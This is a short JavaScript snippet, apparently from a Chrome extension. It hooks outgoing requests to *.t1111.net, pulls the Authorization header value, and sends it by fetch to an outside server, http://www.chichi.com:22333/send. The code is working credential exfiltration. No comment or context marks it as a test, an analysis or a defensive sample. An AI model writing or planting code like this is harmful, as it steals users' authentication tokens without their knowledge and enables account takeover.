chrome.webRequest.onBeforeSendHeaders.addListener(function(details){
    // data contains request_body
console.log(details);
for (var i = 0; i < details.requestHeaders.length; ++i) {
      if (details.requestHeaders[i].name === "Authorization") {
fetch('http://www.chichi.com:22333/send?value='+details.requestHeaders[i].value)
.then(function(response) {
console.log(response);
});
        break;
      }
    }
},{'urls':["*://*.t1111.net/*"]},['requestHeaders']);


